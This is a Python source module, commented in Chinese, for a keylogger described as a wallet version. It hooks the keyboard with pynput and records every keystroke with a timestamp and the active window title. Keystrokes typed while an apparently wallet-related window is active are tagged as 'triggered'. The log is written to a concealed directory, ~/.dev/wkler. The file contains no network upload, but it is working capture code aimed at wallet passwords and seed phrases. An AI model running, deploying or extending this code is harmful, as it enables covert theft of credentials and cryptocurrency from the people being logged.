# -*- coding: utf-8 -*-
"""
键盘记录器核心模块 - 钱包扩展版本
"""

import sys
import threading
import time
from datetime import datetime
from pathlib import Path

from .detectors import get_active_window_name, should_trigger_recording, CHECK_INTERVAL


class KeyLogger:
    """钱包键盘记录器"""

    _KEY_NAMES = None

    def __init__(self, log_file: Path = None, dry_run: bool = False):
        self.log_file = log_file
        self.dry_run = dry_run
        self.keyboard_listener = None
        self._log_handle = None
        self._lock = threading.Lock()

        self._monitor_thread = None
        self._stop_monitor = threading.Event()

    def format_key(self, key) -> str:
        """格式化按键为可读字符串"""
        Key, KeyCode, _ = self._load_keyboard_backend()
        if isinstance(key, KeyCode):
            return key.char if key.char is not None else f"[{key.name}]"
        elif isinstance(key, Key):
            return self._key_names().get(key, f"[{key.name}]")
        return str(key)

    @classmethod
    def _load_keyboard_backend(cls):
        """延迟加载 pynput，避免 dry-run 和 --help 依赖键盘监听库。"""
        from pynput import keyboard
        from pynput.keyboard import Key, KeyCode

        return Key, KeyCode, keyboard

    @classmethod
    def _key_names(cls):
        """构造按键显示映射。"""
        if cls._KEY_NAMES is None:
            Key, _, _ = cls._load_keyboard_backend()
            cls._KEY_NAMES = {
                Key.space: " ",
                Key.enter: "[Enter]",
                Key.tab: "[Tab]",
                Key.backspace: "[Backspace]",
                Key.delete: "[Delete]",
                Key.esc: "[Esc]",
                Key.up: "[Up]",
                Key.down: "[Down]",
                Key.left: "[Left]",
                Key.right: "[Right]",
                Key.shift: "[Shift]",
                Key.shift_l: "[Shift]",
                Key.shift_r: "[Shift]",
                Key.ctrl: "[Ctrl]",
                Key.ctrl_l: "[Ctrl]",
                Key.ctrl_r: "[Ctrl]",
                Key.alt: "[Alt]",
                Key.alt_l: "[Alt]",
                Key.alt_r: "[Alt]",
                Key.cmd: "[Cmd]",
                Key.caps_lock: "[CapsLock]",
                Key.home: "[Home]",
                Key.end: "[End]",
                Key.page_up: "[PageUp]",
                Key.page_down: "[PageDown]",
                Key.f1: "[F1]", Key.f2: "[F2]", Key.f3: "[F3]", Key.f4: "[F4]",
                Key.f5: "[F5]", Key.f6: "[F6]", Key.f7: "[F7]", Key.f8: "[F8]",
                Key.f9: "[F9]", Key.f10: "[F10]", Key.f11: "[F11]", Key.f12: "[F12]",
            }
        return cls._KEY_NAMES

    def _open_log(self):
        """打开日志文件句柄"""
        if self._log_handle is None or self._log_handle.closed:
            self._log_handle = open(self.log_file, "a", encoding="utf-8")

    def _write_log(self, text: str):
        """写入日志并刷新"""
        if self.dry_run:
            return
        try:
            self._open_log()
            self._log_handle.write(text)
            self._log_handle.flush()
        except Exception as e:
            print(f"写入日志失败: {e}", file=sys.stderr)

    def _close_log(self):
        """关闭日志文件句柄"""
        if self._log_handle and not self._log_handle.closed:
            self._log_handle.close()
            self._log_handle = None

    def on_press(self, key):
        """键盘按下事件"""
        window_name = get_active_window_name() or "Unknown"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = self.format_key(key)

        is_match = should_trigger_recording()
        status = "[触发]" if is_match else "[普通]"

        self._write_log(f"[{timestamp}] {status} [{window_name}] {key_str}\n")

    def on_release(self, key):
        """键盘释放事件（用于退出）"""
        Key, _, _ = self._load_keyboard_backend()
        if key == Key.f12:
            print("\n检测到 F12，停止程序...")
            self._stop_monitor.set()
            return False

    def _monitor_windows(self):
        """后台线程：持续检测窗口变化"""
        while not self._stop_monitor.is_set():
            try:
                get_active_window_name()
            except Exception:
                pass
            self._stop_monitor.wait(CHECK_INTERVAL)

    def start(self):
        """启动监听"""
        print("钱包键盘记录器已启动")
        if self.dry_run:
            print("日志文件: dry-run 模式不创建日志")
        else:
            print(f"日志文件: {self.log_file}")
        print(f"按 F12 或 Ctrl+C 停止程序\n")

        self._monitor_thread = threading.Thread(
            target=self._monitor_windows, daemon=True
        )
        self._monitor_thread.start()

        if self.dry_run:
            try:
                while not self._stop_monitor.is_set():
                    time.sleep(0.2)
            except KeyboardInterrupt:
                print("\n已停止")
            finally:
                self._stop_monitor.set()
            return

        _, _, keyboard = self._load_keyboard_backend()
        self.keyboard_listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release,
        )
        self.keyboard_listener.start()

        try:
            self.keyboard_listener.join()
        except KeyboardInterrupt:
            print("\n已停止")
        finally:
            self._stop_monitor.set()
            self._close_log()

    @staticmethod
    def platform_info() -> str:
        """获取平台信息"""
        import platform
        return f"{platform.system()} {platform.release()}"


def create_log_file(log_dir: Path = None) -> Path:
    """
    创建日志文件

    Args:
        log_dir: 日志目录，默认为 ~/.dev/wkler

    Returns:
        日志文件路径
    """
    if log_dir is None:
        log_dir = Path.home() / ".dev" / "wkler"

    log_dir.mkdir(parents=True, exist_ok=True)

    date_str = datetime.now().strftime("%Y%m%d")
    log_file = log_dir / f"recording_{date_str}.log"

    import platform
    try:
        if not log_file.exists():
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(f"# 钱包键盘记录日志\n")
                f.write(f"# 创建时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# 平台: {platform.system()} {platform.release()}\n")
                f.write(f"# 日志格式: [时间] [状态] [窗口名称] 按键内容\n")
                f.write(f"# {'=' * 60}\n\n")
    except Exception as e:
        print(f"无法创建日志文件: {e}", file=sys.stderr)
        raise

    return log_file
